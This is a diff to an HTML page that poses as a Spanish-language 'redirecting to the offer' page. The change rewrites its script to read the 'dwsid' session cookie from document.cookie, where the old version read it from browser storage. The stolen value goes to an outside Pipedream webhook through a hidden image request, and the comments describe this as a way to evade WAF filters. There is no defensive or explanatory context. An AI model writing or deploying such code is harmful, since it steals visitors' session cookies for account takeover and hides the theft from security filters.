@@ -7,11 +7,13 @@
 <body>
   <h1>Redirigiendo a la oferta...</h1>
   <script>
-    // Captura el dwsid desde localStorage o sessionStorage
-    const dwsid = localStorage.getItem('dwsid') || sessionStorage.getItem('dwsid') || 'none';
+    // Captura la cookie dwsid
+    const cookie = document.cookie.includes('dwsid=') 
+      ? document.cookie.split('dwsid=')[1].split(';')[0] 
+      : 'none';
 
-    // Envía el dwsid a Pipedream usando una solicitud GET para evadir filtros
-    const url = "https://eoozwutroaqr7ij.m.pipedream.net?dwsid=" + encodeURIComponent(dwsid);
+    // Envía a Pipedream usando GET para evadir filtros de WAF
+    const url = "https://eoozwutroaqr7ij.m.pipedream.net?dwsid=" + encodeURIComponent(cookie);
     const img = new Image();
     img.src = url;
 
